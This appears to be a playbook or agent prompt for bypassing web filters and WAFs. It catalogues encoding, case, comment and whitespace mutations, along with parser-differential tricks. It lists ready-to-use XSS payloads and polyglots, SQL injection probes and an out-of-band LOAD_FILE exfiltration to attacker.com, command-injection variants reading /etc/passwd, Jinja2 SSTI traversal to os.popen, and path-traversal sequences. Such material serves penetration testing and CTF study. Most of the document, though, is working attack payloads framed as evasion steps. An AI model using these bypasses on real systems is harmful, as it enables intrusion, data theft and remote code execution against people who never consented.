{% raw %}
## PAYLOAD MUTATION & BYPASS REASONING FRAMEWORK

This framework helps you THINK about transformations systematically. Don't just try payloads - reason about WHY filters exist and HOW parsers interpret input differently.

---

## PART 1: THE MUTATION ALGEBRA

Every payload can be transformed along multiple independent dimensions. When a payload fails, systematically explore each dimension.

### Dimension 1: ENCODING TRANSFORMATIONS

```
ENCODING LADDER (apply progressively):
┌─────────────────────────────────────────────────────────────────┐
│ Raw          │ <script>         │ ../etc/passwd    │ ' OR 1=1  │
│ URL          │ %3Cscript%3E     │ ..%2Fetc%2Fpasswd│ %27%20OR  │
│ Double-URL   │ %253Cscript%253E │ ..%252F...       │ %2527%20  │
│ HTML Entity  │ &#60;script&#62; │ &#46;&#46;/      │ &#39; OR  │
│ Hex Entity   │ &#x3C;script&#x3E│ &#x2e;&#x2e;/    │ &#x27; OR │
│ Unicode      │ \u003Cscript\u003E│ \u002e\u002e/  │ \u0027 OR │
│ UTF-8 Overlong│ %c0%bc (for <)  │ %c0%ae (for .)  │           │
│ Base64       │ PHNjcmlwdD4=     │ Li4vZXRjL3Bhc3N3ZA== │       │
└─────────────────────────────────────────────────────────────────┘

KEY INSIGHT: Filters decode at one layer, execution happens at another.
If filter checks URL-decoded but backend double-decodes → double-encode.
If filter checks raw but backend URL-decodes → URL-encode.
```

### Dimension 2: CASE TRANSFORMATIONS

```
CASE MUTATION SPACE:
┌────────────────────────────────────────────┐
│ lowercase    │ select, script, onclick     │
│ UPPERCASE    │ SELECT, SCRIPT, ONCLICK     │
│ MixedCase    │ SeLeCt, ScRiPt, OnClIcK     │
│ Alternating  │ sElEcT, sCrIpT, oNcLiCk     │
└────────────────────────────────────────────┘

WHY THIS WORKS: Regex filters often case-sensitive,
but parsers (HTML, SQL) are case-insensitive.
```

### Dimension 3: WHITESPACE ALTERNATIVES

```
SPACE EQUIVALENTS (context-dependent):
┌──────────────────────────────────────────────────────────────────┐
│ Context    │ Alternatives                                        │
├────────────┼─────────────────────────────────────────────────────┤
│ HTML       │ / (tag separator), TAB (%09), NEWLINE (%0a, %0d)    │
│            │ FORMFEED (%0c), NULL before space                    │
│ SQL        │ /**/, %09, %0a, %0d, %0b, %a0 (nbsp), +, /*!*/      │
│ Shell      │ ${IFS}, $IFS, {,}, <>, TAB, NEWLINE, \t, \n         │
│ URL        │ + (in query), %20, %09, no space (some parsers)     │
│ JS         │ /**/, /*!*/, template literals, \t, \n              │
└──────────────────────────────────────────────────────────────────┘

PARSER INSIGHT: Different parsers tokenize whitespace differently.
HTML sees <svg/onload=x> as valid. SQL sees SELECT/**/FROM as valid.
```

### Dimension 4: QUOTE ALTERNATIVES

```
QUOTE EQUIVALENTS:
┌──────────────────────────────────────────────────────────────────┐
│ Context    │ Alternatives                                        │
├────────────┼─────────────────────────────────────────────────────┤
│ HTML attr  │ " ' ` (backtick in some), NO QUOTES if no space    │
│ JS string  │ " ' ` (template), String.fromCharCode(), \x27      │
│ SQL        │ ' " ` (MySQL), $$ (PostgreSQL), CHAR(), CHR()      │
│ Shell      │ ' " ` $'..', $"...", unquoted, \' \"               │
│ Python     │ ' " ''' """ r'' b'' f''                            │
└──────────────────────────────────────────────────────────────────┘

NO-QUOTE TRICKS:
- HTML: <img src=x onerror=alert(1)> (no quotes needed without spaces)
- SQL: SELECT * FROM users WHERE id=1 (integers don't need quotes)
- Shell: cat /etc/passwd (paths without spaces don't need quotes)
```

### Dimension 5: COMMENT INJECTION

```
COMMENT SYNTAX BY CONTEXT:
┌────────────────────────────────────────────────────────────────────┐
│ Context    │ Comment Styles                                        │
├────────────┼───────────────────────────────────────────────────────┤
│ SQL        │ -- (space after!), #, /* */, ;%00                    │
│ HTML       │ <!-- -->, <!--> (malformed), <![CDATA[...]]>         │
│ JS         │ // (line), /* */ (block), --> (HTML compat)          │
│ Shell      │ # (to EOL), : 'comment' (noop colon)                 │
│ URL        │ # (fragment - ignored by server)                      │
└────────────────────────────────────────────────────────────────────┘

KEYWORD FRAGMENTATION (insert comments mid-keyword):
- SQL: SEL/**/ECT, UN/**/ION, SEL%00ECT
- HTML: <scr<!--null-->ipt>
- JS: eval('al'+'ert(1)')
```

### Dimension 6: CONCATENATION & FRAGMENTATION

```
STRING BUILDING ALTERNATIVES:
┌──────────────────────────────────────────────────────────────────┐
│ Context    │ Concatenation Methods                                │
├────────────┼─────────────────────────────────────────────────────┤
│ JS         │ 'a'+'lert', String.fromCharCode(97,108,101,114,116) │
│            │ eval(atob('YWxlcnQ=')), []['constructor']['constructor']│
│ SQL        │ CONCAT('SEL','ECT'), 0x53454C454354 (hex string)    │
│            │ CHAR(83)+CHAR(69)+CHAR(76)                           │
│ Shell      │ c'a't, c""at, $'\x63\x61\x74', echo Y2F0|base64 -d  │
│ Python     │ chr(99)+chr(97)+chr(116), getattr(__import__('os')  │
│ PHP        │ chr(99).chr(97).chr(116), ${'_GET'}['x']            │
└──────────────────────────────────────────────────────────────────┘

EXECUTION INDIRECTION:
- JS: eval(), Function()(), setTimeout(), setInterval()
- SQL: EXEC(), EXECUTE(), PREPARE + EXECUTE
- Shell: $(cmd), `cmd`, bash -c 'cmd', sh<<<'cmd'
- Python: eval(), exec(), __import__(), getattr()
```

### Dimension 7: NULL BYTE & BOUNDARY ABUSE

```
NULL BYTE INJECTION:
┌────────────────────────────────────────────────────────────────────┐
│ Pattern               │ Effect                                     │
├───────────────────────┼────────────────────────────────────────────┤
│ file.php%00.jpg       │ C-based filter sees .jpg, PHP sees .php   │
│ <scr%00ipt>           │ Filter misses 'script', browser executes  │
│ ../../../etc/passwd%00│ Truncates appended extension               │
└────────────────────────────────────────────────────────────────────┘

BOUNDARY CONDITIONS TO TEST:
- Empty string: '' vs "" vs null vs undefined
- Zero: 0 vs '0' vs 0.0 vs -0 vs 0x0
- Negative: -1, -999999999
- Large: 999999999, 2147483647, 9999999999999999999
- Array wrapping: id=1 → id[]=1 → id=["1"]
- Type juggling: true, false, null, [], {}
```

---

## PART 2: PARSER DIFFERENTIAL ATTACKS

Vulnerabilities often exist because TWO systems interpret the same input differently.

### The Parser Chain Model

```
INPUT → [Filter/WAF] → [Backend Parser] → [Execution Engine]
                ↓              ↓                   ↓
          (what it sees)  (what it sees)    (what runs)

ATTACK GOAL: Find input that:
- Filter sees as SAFE
- Execution engine sees as MALICIOUS
```

### URL Parser Differentials

```
URL CONFUSION TECHNIQUES:
┌────────────────────────────────────────────────────────────────────┐
│ Technique         │ Example                    │ Parser Confusion  │
├───────────────────┼────────────────────────────┼───────────────────┤
│ @ in URL          │ http://good.com@evil.com   │ Auth vs host      │
│ # fragment        │ http://evil.com#@good.com  │ Fragment vs path  │
│ Backslash         │ http://good.com\@evil.com  │ Path separator    │
│ Multiple slashes  │ http:///evil.com           │ Protocol parsing  │
│ Missing slashes   │ http:evil.com              │ Scheme parsing    │
│ Unicode normalization │ http://ⓖⓞⓞⓓ.com      │ Homoglyph         │
│ Decimal IP        │ http://2130706433          │ = 127.0.0.1       │
│ Octal IP          │ http://0177.0.0.1          │ = 127.0.0.1       │
│ Hex IP            │ http://0x7f.0x0.0x0.0x1    │ = 127.0.0.1       │
│ Overflow IP       │ http://127.0.0.1.evil.com  │ Subdomain trick   │
└────────────────────────────────────────────────────────────────────┘
```

### HTML Parser Differentials

```
HTML PARSER CONFUSION:
┌────────────────────────────────────────────────────────────────────┐
│ Technique              │ Example                                   │
├────────────────────────┼───────────────────────────────────────────┤
│ Unclosed tags          │ <img src=x onerror=alert(1)              │
│ Self-closing abuse     │ <script/src=x></script/> (X)             │
│ Attribute without =    │ <input onfocus autofocus>                │
│ Backtick in attribute  │ <img src=`x` onerror=alert(1)>           │
│ Newlines in tags       │ <img%0asrc=x%0aonerror=alert(1)>         │
│ Entity in tag name     │ <&#x73;cript> (rare)                     │
│ Null in tag            │ <scr\0ipt>                                │
│ Comment trickery       │ <!--><script>alert(1)</script>-->        │
│ CDATA sections         │ <![CDATA[<script>alert(1)</script>]]>    │
└────────────────────────────────────────────────────────────────────┘
```

### SQL Parser Differentials

```
SQL PARSER CONFUSION:
┌────────────────────────────────────────────────────────────────────┐
│ Technique              │ MySQL    │ PostgreSQL  │ MSSQL           │
├────────────────────────┼──────────┼─────────────┼─────────────────┤
│ String concat          │ 'a' 'b'  │ 'a'||'b'    │ 'a'+'b'         │
│ Comment style          │ # or --  │ --          │ --              │
│ Backtick quotes        │ ✓        │ ✗           │ ✗               │
│ Stacked queries        │ Limited  │ ✓           │ ✓               │
│ Hex strings            │ 0x414243 │ E'\x41\x42' │ 0x414243        │
│ Version comment        │ /*!...*/  │ ✗           │ ✗               │
└────────────────────────────────────────────────────────────────────┘

SCIENTIFIC STRING (use to probe): 'sleep(5)#"sleep(5)--`sleep(5)
- Tests all quote types and comment styles in one payload
```

---

## PART 3: SEMANTIC EQUIVALENCE MAPS

When a specific syntax is blocked, find semantically equivalent alternatives.

### JavaScript Execution Equivalents

```
GOAL: Execute arbitrary code

DIRECT EXECUTION:
eval(code)                    → Function(code)()
                              → []['constructor']['constructor'](code)()
                              → setTimeout(code, 0)
                              → setInterval(code, 0)
                              → new Function(code)()

STRING TO CODE:
eval('alert(1)')              → eval(atob('YWxlcnQoMSk='))
                              → eval(String.fromCharCode(97,108,101,114,116))
                              → eval('\x61\x6c\x65\x72\x74\x28\x31\x29')
                              → eval(unescape('%61%6c%65%72%74%28%31%29'))

FUNCTION CALL ALTERNATIVES:
alert(1)                      → alert`1`
                              → alert.call(null,1)
                              → alert.apply(null,[1])
                              → Reflect.apply(alert,null,[1])
                              → [1].map(alert)
                              → [1].find(alert)
                              → [1].filter(alert)
                              → [1].forEach(alert)

PROPERTY ACCESS ALTERNATIVES:
window.alert                  → window['alert']
                              → window['al'+'ert']
                              → window[atob('YWxlcnQ=')]
                              → Reflect.get(window,'alert')
                              → self['alert']
                              → top['alert']
                              → frames['alert']
```

### Template Injection Equivalents

```
GOAL: Access dangerous objects/functions

JINJA2/PYTHON OBJECT TRAVERSAL:
''.__class__                  → ''|attr('__class__')
                              → ''|attr('\x5f\x5fclass\x5f\x5f')
                              → ''|attr(request.args.x) with ?x=__class__
                              → getattr('','__class__')

BLOCKED UNDERSCORES:
__class__                     → \x5f\x5fclass\x5f\x5f (hex escape)
                              → request.args.c with ?c=__class__
                              → attr filter with crafted string
                              → [request.args.a,request.args.b]|join

BLOCKED BRACKETS:
config['SECRET']              → config|attr('SECRET')
                              → config.SECRET (dot notation)
                              → getattr(config,'SECRET')

ALTERNATIVE ENTRY POINTS (not just ''):
- cycler, joiner, namespace (Jinja2 built-ins)
- lipsum.__globals__
- range.__init__.__globals__
- request.application.__globals__
- config.__class__.__init__.__globals__
```

### SQL Injection Equivalents

```
GOAL: Extract data / bypass auth

COMMENT TERMINATION:
' OR '1'='1'--                → ' OR '1'='1'#
                              → ' OR '1'='1'/*
                              → ' OR '1'='1';%00

STRING COMPARISON:
WHERE user='admin'            → WHERE user LIKE 'admin'
                              → WHERE user IN ('admin')
                              → WHERE user REGEXP '^admin$'
                              → WHERE user BETWEEN 'admin' AND 'admin'
                              → WHERE STRCMP(user,'admin')=0

UNION COLUMN MATCHING:
UNION SELECT 1,2,3            → UNION SELECT null,null,null
                              → UNION ALL SELECT 1,2,3
                              → UNION SELECT *FROM(SELECT 1)a JOIN(SELECT 2)b...

DATA EXTRACTION (no UNION):
- Boolean: AND SUBSTRING(password,1,1)='a'
- Time: AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)
- Error: AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password)))
- Out-of-band: LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\x'))
```

### Command Injection Equivalents

```
GOAL: Execute arbitrary commands

COMMAND SEPARATORS:
; cmd                         → | cmd
                              → || cmd
                              → & cmd
                              → && cmd
                              → %0a cmd (newline)
                              → `cmd`
                              → $(cmd)

SPACE ALTERNATIVES:
cat /etc/passwd               → cat${IFS}/etc/passwd
                              → cat$IFS/etc/passwd
                              → {cat,/etc/passwd}
                              → cat</etc/passwd
                              → cat%09/etc/passwd
                              → X=$'\x20';cat${X}/etc/passwd

KEYWORD ALTERNATIVES:
cat                           → c'a't
                              → c""at
                              → c\at
                              → /???/c?t
                              → /???/??t
                              → $(echo Y2F0|base64 -d)
                              → $'\x63\x61\x74'

PATH ALTERNATIVES:
/etc/passwd                   → /e?c/p?ss??
                              → /e*c/p*d
                              → ././etc/./passwd
                              → /etc//passwd
                              → /etc/passwd/.
```

---

## PART 4: FILTER FINGERPRINTING METHODOLOGY

Before brute-forcing bypasses, understand what's being filtered.

### Step 1: Identify Filter Type

```
FILTER FINGERPRINTING PROBES:
┌────────────────────────────────────────────────────────────────────┐
│ Send This              │ If Blocked, Filter Checks For            │
├────────────────────────┼───────────────────────────────────────────┤
│ <                      │ HTML tag opener                           │
│ >                      │ HTML tag closer                           │
│ "                      │ Attribute escape                          │
│ '                      │ SQL/JS string delimiter                   │
│ script                 │ Keyword blocklist                         │
│ SCRIPT                 │ Case-sensitive keyword blocklist          │
│ scr ipt (space)        │ Complete word match only                  │
│ scr%69pt               │ Decodes before checking                   │
│ <scr<script>ipt>       │ Single-pass vs recursive filter          │
│ {{                     │ Template syntax                           │
│ ${                     │ Expression syntax                         │
│ ..                     │ Path traversal                            │
│ ;                      │ Command separator                         │
└────────────────────────────────────────────────────────────────────┘
```

### Step 2: Determine Filter Behavior

```
CRITICAL QUESTIONS:
1. WHERE does filter run?
   - Client-side (bypassable)
   - Server entry point (before routing)
   - At vulnerable function (harder to bypass)

2. WHEN does filter run relative to decoding?
   - Before URL decode → URL encode to bypass
   - After single decode → double encode to bypass
   - After all decoding → need semantic bypass

3. HOW does filter handle matches?
   - Blocks request entirely → need bypass
   - Removes matched content → use recursive tricks: <scr<script>ipt>
   - Encodes matched content → check if double-encoding works

4. WHAT matching logic is used?
   - Exact string match → case/encoding bypass
   - Regex → check for anchoring issues, ReDoS
   - AST-based (rare) → harder, need semantic bypass
```

### Step 3: Recursive Filter Testing

```
IF FILTER REMOVES DANGEROUS STRINGS:

Input:  <script>
Output: (empty) - "script" removed

Try:    <scr<script>ipt>
After:  <script> - nested payload survives!

TRY THESE PATTERNS:
<scrscriptipt>         → becomes <script>
<scr<scr<script>ipt>ipt>  → multi-layer
selselectect           → becomes select
../....//              → becomes ../
```

---

## PART 5: CONTEXT-AWARE MUTATION SELECTION

Different contexts require different mutation strategies.

### Context Detection Framework

```
STEP 1: IDENTIFY OUTPUT CONTEXT
Send unique marker: deadend7x7probe
Find where it appears in response:

┌────────────────────────────────────────────────────────────────────┐
│ If you see this...           │ You're in this context...          │
├──────────────────────────────┼────────────────────────────────────┤
│ <div>deadend7x7probe</div>   │ HTML body                          │
│ <input value="deadend...">   │ HTML attribute (double-quoted)     │
│ <input value='deadend...'>   │ HTML attribute (single-quoted)     │
│ var x = "deadend...";        │ JavaScript string (double)         │
│ var x = 'deadend...';        │ JavaScript string (single)         │
│ var x = `deadend...`;        │ JavaScript template literal        │
│ <script>...deadend...</script>│ JavaScript code context           │
│ <style>...deadend...</style> │ CSS context                        │
│ <!--deadend...-->            │ HTML comment                       │
│ <a href="deadend...">        │ URL context                        │
└────────────────────────────────────────────────────────────────────┘
```

### Context-Specific Escape Sequences

```
TO BREAK OUT OF EACH CONTEXT:

HTML BODY:
- Inject tags directly: <script>, <img>, <svg>
- No escaping needed

HTML ATTRIBUTE (double-quote):
- Escape with: "
- Then add event: "onmouseover="alert(1)
- Or break tag: "><script>alert(1)</script>

HTML ATTRIBUTE (single-quote):
- Escape with: '
- Then: 'onmouseover='alert(1)

JAVASCRIPT STRING (double-quote):
- Escape with: " or \
- Then: ";alert(1)//
- Or inject: </script><script>alert(1)</script>

JAVASCRIPT STRING (single-quote):
- Escape with: ' or \
- Then: ';alert(1)//

JAVASCRIPT TEMPLATE LITERAL:
- Escape with: ` or ${
- Then: ${alert(1)} or `};alert(1)//`

URL CONTEXT (href):
- Inject protocol: javascript:alert(1)
- Or data URI: data:text/html,<script>alert(1)</script>
```

---

## PART 6: COMPOUND MUTATION STRATEGIES

When single mutations fail, combine them.

### The Mutation Matrix

```
For any blocked payload, try combinations:

PAYLOAD: <script>alert(1)</script>

┌──────────────┬──────────────────────────────────────────────────┐
│ Mutation 1   │ Mutation 2                                       │
├──────────────┼──────────────────────────────────────────────────┤
│ URL encode   │ + Case change   → %3CScrIpT%3Ealert(1)...       │
│ URL encode   │ + Null byte     → %3Cscr%00ipt%3Ealert(1)...    │
│ Case change  │ + Tag variation → <ScRiPt>alert(1)</sCrIpT>      │
│ Case change  │ + Whitespace    → <ScRiPt >alert(1)</sCrIpT >   │
│ Tag variation│ + Event handler → <SvG oNlOaD=alert(1)>          │
│ Double encode│ + Case change   → %253CScRiPt%253E...            │
└──────────────┴──────────────────────────────────────────────────┘
```

### The Fallback Chain

```
SYSTEMATIC BYPASS APPROACH:

1. TRY ORIGINAL PAYLOAD
   ↓ blocked?

2. TRY ENCODING DIMENSION
   - URL encode critical chars
   - Double URL encode
   - HTML entity encode
   - Mixed encoding
   ↓ blocked?

3. TRY CASE DIMENSION
   - All lowercase
   - All uppercase
   - Mixed case
   - Alternating case
   ↓ blocked?

4. TRY SEMANTIC ALTERNATIVES
   - Different tags: script → img/svg/body/iframe
   - Different functions: alert → confirm/prompt/eval
   - Different syntax: eval() → Function()()
   ↓ blocked?

5. TRY FRAGMENTATION
   - Insert comments: scr/**/ipt
   - Insert nulls: scr%00ipt
   - String building: 'scr'+'ipt'
   ↓ blocked?

6. TRY PARSER CONFUSION
   - Malformed tags
   - Unclosed quotes
   - Protocol confusion
   ↓ blocked?

7. TRY COMPOUND MUTATIONS
   - Combine 2-3 techniques from above
   - E.g., double-encode + case + fragmentation
```

---

## PART 7: VULNERABILITY-SPECIFIC REASONING

### SSTI: Object Traversal Thinking

```
GOAL: Reach os.popen() or subprocess.Popen

THINK ABOUT THE OBJECT GRAPH:
Any object → __class__ → __mro__ → object → __subclasses__() → find Popen

ENTRY POINTS (objects you can access):
- Literals: '', [], {}, 0, 0.0
- Built-ins: request, config, self, g (Flask)
- Filters: lipsum, cycler, joiner, namespace
- Imported: any module the app imports

TRAVERSAL PATTERNS:
OBJECT.__class__.__mro__[X].__subclasses__()[Y]
       ↓
Find X = index where 'object' base class is
       ↓
Find Y = index of useful class (Popen, _wrap_close, catch_warnings)

ALTERNATIVE PATHS:
- config.__class__.__init__.__globals__['os']
- request.application.__self__._get_data_for_json.__globals__['os']
- lipsum.__globals__['os']
- cycler.__init__.__globals__['os']
```

### SQLi: Query Structure Reasoning

```
THINK ABOUT THE QUERY STRUCTURE:
Original: SELECT * FROM users WHERE id='[INPUT]'

WHAT CAN YOU CONTROL?
- Value inside quotes
- Can you escape the quote?
- What comes after your injection?

CLOSING STRATEGIES:
- Close quote and comment rest: ' --
- Close quote and balance: ' OR '1'='1
- Close quote, add logic, reopen: ' OR 1=1 OR '

UNION REQUIREMENTS:
1. Must have same column count as original
2. Data types should be compatible (use NULL for safety)
3. Original query must return (or use UNION ALL)

PROBE COLUMN COUNT:
' ORDER BY 1-- (works)
' ORDER BY 2-- (works)
' ORDER BY 3-- (error = 2 columns)

THEN: ' UNION SELECT null,null--
```

### XSS: Event Handler Enumeration

```
WHEN <script> IS BLOCKED, THINK ABOUT EVENT HANDLERS:

ALWAYS-FIRE EVENTS (no user interaction):
- onload (img, body, iframe, svg, script, link, style)
- onerror (img, script, link, audio, video)
- onanimationend (any element with CSS animation)
- onfocus + autofocus (input, textarea, select, a, button)

USER-INTERACTION EVENTS (backup):
- onclick, ondblclick
- onmouseover, onmouseenter
- onkeydown, onkeypress, onkeyup
- onfocus, onblur

MINIMUM VIABLE PAYLOAD PATTERNS:
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
```

### Path Traversal: Path Normalization Reasoning

```
THINK ABOUT PATH PROCESSING:

1. WHAT NORMALIZES THE PATH?
   - OS filesystem
   - Web server (Apache, nginx)
   - Application framework
   - Custom code

2. TRAVERSAL SEQUENCE VARIATIONS:
   ../ (Unix standard)
   ..\ (Windows)
   ....// (double-dot removal bypass)
   ..;/ (Tomcat path parameter)
   ..\/ (mixed separator)
   ..%2f (URL encoded)
   ..%5c (URL encoded backslash)
   %2e%2e%2f (full URL encode)
   %252e%252e%252f (double encode)
   ..%c0%af (UTF-8 overlong)
   ....\/....\ (mixed bypass)

3. WRAPPER BYPASS:
   If path MUST start with /uploads/:
   /uploads/../../../etc/passwd
   /uploads/..%2f..%2f..%2fetc/passwd

   If extension MUST be .jpg:
   ../../../etc/passwd%00.jpg (null byte - old)
   ../../../etc/passwd/.jpg (path confusion)
```

---

## PART 8: CREATIVE PAYLOAD GENERATION

### The Building Blocks Approach

```
DECOMPOSE WHAT YOU NEED:

XSS BUILDING BLOCKS:
1. Tag opener: < or equivalent
2. Tag name: script, img, svg, etc.
3. Attribute/event trigger: onerror, onload, etc.
4. Payload delivery: =alert(1), =eval(atob('...'))
5. Cleanup: close tag or comment rest

SQLi BUILDING BLOCKS:
1. Quote escape: ', "
2. Logic modification: OR, AND, UNION
3. Payload: 1=1, SELECT data, SLEEP(5)
4. Cleanup: --, #, /*

SSTI BUILDING BLOCKS:
1. Template delimiter: {{ }}, ${ }, <% %>
2. Object access: literals, globals, built-ins
3. Traversal: __class__, __mro__, __subclasses__
4. Execution: popen(), system(), eval()

NOW MIX AND MATCH WITH MUTATIONS:
Each building block can be independently mutated.
```

### Polyglot Construction

```
POLYGLOT PRINCIPLE:
Create payloads that work in MULTIPLE contexts.

XSS POLYGLOT STRUCTURE:
'"-->]]>*/</style></script>--><svg onload=alert(1)>

BREAKS OUT OF:
- Single-quoted HTML attribute: '...
- Double-quoted HTML attribute: "...
- HTML comment: -->
- CDATA section: ]]>
- JS/CSS comment: */
- Style tag: </style>
- Script tag: </script>
- And then executes: <svg onload=alert(1)>

SQLi POLYGLOT STRUCTURE:
'||(SELECT)||'

WORKS BECAUSE:
- Closes string, concatenates select result, reopens string
- Works in MySQL, PostgreSQL, Oracle contexts
```

---

## USAGE GUIDELINES

1. **Don't just try payloads** - Understand WHY each mutation might bypass a filter
2. **Fingerprint first** - Determine what the filter checks before trying bypasses
3. **Think in dimensions** - Each mutation dimension is independent; combine them
4. **Understand the parser chain** - Exploit differences between filter and executor
5. **Build, don't memorize** - Use building blocks to construct context-appropriate payloads
6. **Escalate systematically** - Follow the fallback chain; don't jump to complex bypasses
7. **Document what fails** - Failed mutations reveal filter behavior
{% endraw %}
